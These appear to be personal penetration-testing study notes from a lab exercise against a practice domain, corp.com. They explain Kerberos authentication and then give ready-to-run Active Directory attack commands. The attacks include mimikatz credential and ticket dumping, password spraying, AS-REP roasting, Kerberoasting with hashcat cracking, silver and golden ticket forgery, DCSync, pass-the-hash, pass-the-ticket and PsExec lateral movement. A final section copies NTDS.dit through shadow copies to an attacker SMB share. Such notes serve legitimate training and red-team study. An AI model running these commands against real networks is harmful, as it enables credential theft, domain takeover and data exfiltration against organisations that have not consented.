3. KDC responds with a AS-REP -- containing 1) session key -- encrypted using user's psswd hash -- and 2) TGT
-- encrypted with krbtgt hash -- containing info on the user, domain, timestamp, ip, session key
4. tgt valid for 10 hours --then renewed



##### TGS
1. client wanting access to domain resources -- sends a TGS-REQ to KDC -- containing 1)username 2)
timestamp --encrypted with session key 3) name of resource 4) encrypted TGT
2. KDC receives the TGS-REQ -- checks if the resource exists -- decrypts TGT with krbtgt hash -- if successful
will get session key from within the TGT -- then the session key is used to decrypt username and timestamp --
then checks if timestamp is valid -- username from TGS matches the one in TGT -- client ip matches TGT ip
3. KDC sends a TGS-REP -- containing 1)name of granted service 2) session key used between client and
service 3)service ticket -- encrypted with the passwd hash of the service in question -- containing username,
group memberships, new session key -- new session key encrypted with the original session key used at the
creation of the TGT





##### SERVICE
1. client sends AP-REQ to application server containing-- 1)service ticket 2)timestamp -- encrypted with session
key
2. app server receives the AP-REQ -- decrypts the service ticket with its own passwd hash -- got the session key
from the decryption -- use the session key to decrypt username from AP-REQ -- if matched then service
assigns appropriate permissions -- service is granted



##### CACHED AD CREDS
- stored in lsass memory space
- need at least local admin priv to access lsass.exe
- realistically, AV will detect presence of mimikatz -- to get around this 1) inject and run mimikatz from memory via
powershell 2) dump the entire lsass.exe and move it to our kali to crack
- LSA protection can be enabled to prevent mimikatz from extracting hashes -- LSA protection sets a registry key and
lsass cant be read in memory
- mimikatz ran on older OS like windows 7 would reveal plaintext paswd due to WDigest being enabled -- windows
2003 would employ ntlm -- and window 2008 and later would be both ntlm and SHA-1 (common with AES)
```
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
OR
```
sekurlsa::tickets
```
//kerberos tickets stored in memory





---
### PUBLIC KEY INFRASTRUCTURE -- PKI

- Active Directory Certificate Services --AD CS -- implements a PKI -- exchanges digital certificates between
authenticated users and trusted resources
- a server installed as -- certificate authority --can issue and revoke ditigal certs
- certs can be issued to web servers to use https -- or to authenticate users based on certs from the CA -- via smart
cards
- these certs supposedly cannot be exported with private key -- however mimikatz can circumvent this -- via crypto::capi OR crypto::cng modules





---
### SET ADDITIONAL PASSWD
```
$user = rob
$pass = 'Password888!'
$secstring = convertto-securestring $pass -asplaintext -force
$cred = new-object system.management.automation.psscredential $user, $secstring
set-domainuserpassword -identity rob -accountpassword $secstring
```
//set an additional pass for rob









---
### ATTACKING AD


#### PASSWD SPRAYING
//gotta be cautious of account lockouts
```
net accounts
```
//focus on lockout threshold -- lockout duration -- and lockout observation window

##### via ldap -- low and slow password attack style
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
New-Object System.DirectoryServices.DirectoryEntry($SearchString, "peter", "Lexus888!")
```
//this spraying tactic is implemented in spray_passwords.ps1

##### via SMB/winrm/rdp/ssh with netexec
//drawbacks -- generates lots of network traffic and -- relatively slow
```
netexec smb 192.168.249.75 -u users.txt -p 'Lexus888!' -d corp.com --continue-on-success
netexec smb 192.168.249.0/24 -u peter -p 'Lexus888!' --continue-on-success
```

##### TGT -- with kerbrute
```
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Lexus888!"
```
//provide a username and password -- If the credentials are valid, we'll obtain a TGT -- The advantage of this
technique is that itonly uses two UDP frames to determine whether the password is valid -- as it sends only an ASREQ
and examines the response.




---
### AS-REP ROASTING

#### FOR KALI
- essentially -- the kerberos auth to get TGT is aka -- kerberos preauthentication -- to prevent offline passwd guessing
- with the preauth disabled -- an attacker can send AS-REQ as any domain users -- grab their TGTs -- then crack them
offline
- kerberos preauth is normally enabled -- only in rare cases will it be disbled
```
impacket-GetNPUsers -dc-ip 192.168.xx.xx -request -outputfile hashes.asreproast corp.com/peter
```
OR
```
impacket-GetNPUsers corp.com/ -dc-ip 192.168.xxx.xx -usersfile users.txt
```
- this works too -- here we use just a list of users
- note that we need the / after domain name -- or it wouldnt work
- this means we only need a list of users -- no passwd needed
- could put in -no-pass -- but not necessary in this case
- then crack the hash(es)


#### FOR WINDOWS
```
.\Rubeus.exe asreproast /nowrap
```
- use rubeus to perform asrep-roasting
- /nowrap for new newline added
- no need to provide user lists -- rubeus can handle that -- because we're already authenticated
- then crack the hash




---
### KERBEROASTING
- When requesting the service ticket from the domain controller, -- no checks are performed -- to confirm whether the
user has any permissions to access the service hosted by the SPN.
- These checks are performed as a second step only when connecting to the service itself -- This means that if we
know the SPN we want to target -- we can request a service ticket for it from the domain controller.
- The service ticket is encrypted using the SPN's password hash --. If we can request the ticket and decrypt it using
brute force or guessin -- we can use this information to crack the cleartext password of the service account -- This
technique is known as Kerberoasting.


#### FOR WINDOWS
```
.\rubeus.exe kerberoast /outfile:hash.kerberoast
```
//got iis' hash
```
hashcat --help | grep -i kerberos
```
//there's a few -- but looking at our hash stating with $krb5tgs$23$ -- we know it's type 23 -- so it's -m 13100
```
hashcat -m 13100 iis.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
//cracked -- Blueberry8

#### FOR KALI
```
impacket-GetUserSPNs -dc-ip 192.168.xxx.xx 'corp.com/peter:Lexus888!' -request
```
- need -request
- note that attacking user accounts is much more feasible -- because user passwd might be weak -- while service
accounts' passwd are randomly generated and 120 characters long
- if SPN runs in the contect of a computer account -- a managed service account -- or a group-managed service
account -- this wouldnt be feasible
- with genericwrite or generic perms -- changing another user's passwd may raise suspicions -- an alternative would
be to set an SPN for the account --then kerberoast it -- then crack the hash offline -- but still -- creating a new user
might be a better option






---
### SILVER TICKETS

- forge our own service tickets
- because Privileged Account Certificate (PAC) validation is rarely performed by service applications -- silver tickets
attack is possible
- when we auth to an app server -- the server will determine our permissions based on what's in the service ticket --
now with the service account passwd or its ntlm hash at hand -- we can forge our own ticket -- with whatever perms
we want
- we need 3 things to create a silver ticket
1. SPN passwd hash
2. Domain SID
3. Target SPN

```
.\mimikatz “privilege::debug” “sekurlsa::logonpasswords” “exit”
```
//if we're local admin -- and know iis_service has session on our machine -- use mimikatz to dump hash of iis_service
4d28cf52xxxxxxxxxxxxxxx84ca09

//to get our own SID
```
whoami /user
```
S-1-5-21-xxxxx-xxxxxxx-xxxxxxx-1105
//be sure to omit the last section -- RID

```
kerberos::golden /sid:S-1-5-21-xxxxx-xxxxxxx-xxxxxxx /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d2xxxxxxxxxxxxxxxxxca09 /user:jeffadmin
```
//use mimikatz kerberos::golden module to craft our silver ticket
```
klist
```
//verify
```
iwr -usedefaultcredentials http://web08
```
//and now we have access
//note that source code doesnt fully show by default -- if we're looking for a specific string -- use | select-string




---
### DCSYNC
- essentially -- DC needs redundancy especially in production environment -- therefore it needs to be sync or
replicated at times
- fortunately -- DC does not check if the replication request comes from a another DC -- but only associated SID with
enough priv -- specifically Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory
Changes in Filtered Set rights-- which the following users have -- domain admins -- local admins -- and enterprise
admins
- essentially -- we impersonate a DC

#### FOR WINDOWS
```
.\mimikatz
lsadump::dcsync /user:corp\dave
```
//dump only dave's hash -- in the context of replication


#### FOR KALI
```
impacket-secretsdump -just-dc-user dave 'corp/jebbadm:gahaha2088!@192.168.xxx.xx'
```
//only get user dave's hash
```
impacket-secretsdump -just-dc-user krbtgt 'corp/jebbadm:gahaha2088!@192.168.xxx.xx'
```
//only grab krbtgt nt hash for persistence

```
impacket-secretsdump -just-dc 'corp/jebbadm:gahaha2088!@192.168.xxx.xx'
```
//or dump all users on dc





---
### AD LATERAL MOVEMENT
- a tactic consisting of various techniques aimedat gaining further access within the target network.
- As described in theMITRE Framework, thesetechniques may use the current valid account or reuse authentication
material such as -- password hashes, Kerberos tickets, and application access tokens -- obtained from the previous
attack stages.




---
#### PSEXEC
- three requisites must be met. -- First, the user that authenticates to thetarget machine needs to be part of the
Administrators local group.-- Second, the ADMIN$ share must be available, and third, -- File andPrinter Sharing has to
be turned on
- fortunately second and third requirments are enabled by default on modern windows config
- To execute the command remotely, PsExec performs the following tasks:
1. Writes psexesvc.exe into the C:\Windows directory
2. Creates and spawns a service on the remote host
3. Runs the requested program/command as a child process of psexesvc.exe
```
.\psexec64.exe -i \\web04 -u corp\jen -p 'Nexus123!' cmd
```
//should work -- but if not -- just use impacket-psexec
```
impacket-psexec 'corp/jen:Lexus888!@192.168.xxx.xx'
```
//superb tool


---
#### PASS THE HASH
- use ntlm hash to authenticate -- instead of the usual plaintext
- only works with ntlm -- not kerberos
- tools with pass the hash technique -- psexec -- impacket -- netexec -- pth-toolkit
- 3 prereqs for pth
1. requires smb connection -- so port 445
2. windows file and printer sharing have to be enabled
3. the admin$ to be available
```
impacket-wmiexec -hashes :2892xxxxxxxxxxxxxxxx5E Administrator@192.168.xx.xx
```
//wmi-exec works as well as smbexec and psexec




---
### OVERPASS THE HASH

- essentially -- over abuse the ntlm to get TGT -- then use the TGT to get TGS
- to auth as another user to get their creds to get cached on a machine -- simply shift+right click on a program -- then
run as a different user -- input their creds -- then have to open a new admin shell -- NOTE that it has to be a new shell
-- running mimikatz logonpasswords won't get this new creds -- has to be a new admin shell -- run mimikatz
```
.\mimi
sekurlsa::logonpasswords
```
//got jenn : 369dxxxxxxxxx075
```
sekurlsa::pth /user:jenn /domain:corp.com /ntlm:369xxxxxxxxxx075 /run:powershell
```
//then a new powershell will pop up
```
whoami
```
//still jeff -- but don't get confused we're already jenn -- just intended behavior of the whoami utility which only checks the current process's token anddoes not inspect any imported Kerberos tickets
```
klist
```
//no ticket yet cause we havent authed to any service
```
net use \\web08
```
//auth to network share on web04 via cifs service
```
klist
```
//now we got a TGS
//notice ticket#0 is TGT because -- server is krbtgt
//while ticket#1 is TGS -- server being cifs/web08
```
.\psexec \\web08 cmd
```


---
#### PASS THE TICKET
- pass the ticket emphasizes the TGS -- as it offers more flexibility
- pass the ticket TGS can be exported and re-injected on other machines to auth to a specific service
- if the service ticket belongs to the current user -- no admin priv required
- essentially -- we will
1. use `mimikatz sekurlsa::tickets /export` -- to steal TGT and TGS of another user
2. use `mimikatz kerberos::ptt [<ticket>.kirbi]` -- to inject the ticket we want into our own session
```
ls \\web04\backup
```
//access denied as jen
```
.\mimikatz “privilege::debug” “sekurlsa::tickets /export” “exit”
```
//and we see a bunch of tickets in .kirbi
//we pick dave's cifs of web04
```
.\mimikatz “privilege::debug” “kerberos::ptt [0;157665]-0-0-40810000-dave@cifs-web04.kirbi” “exit”
klist
```
//got dave's ticket




---
### AD PERSISTENCE
- techniques aimed at maintaining an attacker's foothold on the targetnetwork
- Note that in many real-world penetration tests or red-team engagements, persistence is not part of the scope -- due
to the risk of incomplete removal once the assessment is complete.


---
### GOLDEN TICKET
- While Silver Tickets aim toforge a TGS ticket to access a specific service, -- Golden Tickets giveus permission to
access the entire domain's resources
- one example is to create a TGT stating that our low-priv user is a member of domain admins group
- best advantage is that the krbtgt account password is not automatically changed.
- This password is only changed when the domain functional level is upgraded from a pre-2008 Windows server, -- but
not from a newer version
- just need to get the hash of krbtgt account -- so 1) we have to already be in domain admins group OR 2) have
compromised DC
```
.\psexec64.exe \\dc1 cmd.exe
```
//access denied -- as expectde

```
.\mimikatz “lsadump::lsa /patch
```
//and grab 1) krbtgt account hash AND 2) domain sid
//then best to go back and work over at compromised machine
```
kerberos::purge
```
//remove existing tickets
```
kerberos::golden /user:benn /domain:corp.com /sid:S-1-5-21-xxxxxxx-xxxxxxx-xxxxx /krbtgt:
169xxxxxxxxxxxxxxxxf47 /ptt
```
- user doesnt even have to exist
- note that forging a golden ticket does not require admin priv --and can even be done on non-domain-joined machines
```
misc::cmd
```
//so we can launch a new cmd prompt with psexec
```
.\psexec \\dc1 cmd.exe
```
//done
```
whoami /groups
```
//we're in domain admins group





---
### SHADOW COPIES
- shadow copy -- also known as Volume Shadow Service (VSS) -- is a Microsoft backuptechnology that allows the creation of snapshots of files or entire volumes
- vshadow.exe is used
- as domain admin -- we can leverage vshadow utility to create shadow copy -- to extract ntds.dit -- then grab system
hive
```
vshadow.exe -nw -p C:
```
//if successful -- check out shadow copy device name

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
//gotta add \windows\ntds\ntds.dit ourself
//then copy it another dir
```
reg save hklm\system c:\system.bak
```
- copy system hive key as well
- fire up impacket-smbserver -- then
```
net use \\192.168.xx.xxx\share
```
```
copy ntds.dit.bak \\192.168.xx.xxx\share
```
//exfil the two files
```
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```
//exfil and use secretsdump to dump

OR

```
impacket-secretsdump -just-dc 'corp/jevvadmin:BrougagaFung8erorateBroom2088!@192.168.xxx.xx'
```
//or just dump hashes on DC -- including krbtgt remotely -- with creds of a domain admin
```
impacket-secretsdump 'corp/jevvadmin:BrougagaFung8erorateBroom2088!@192.168.xxx.xx' -use-vss
```
//with -use-vss (volume shadow copy) option -- ran remotely


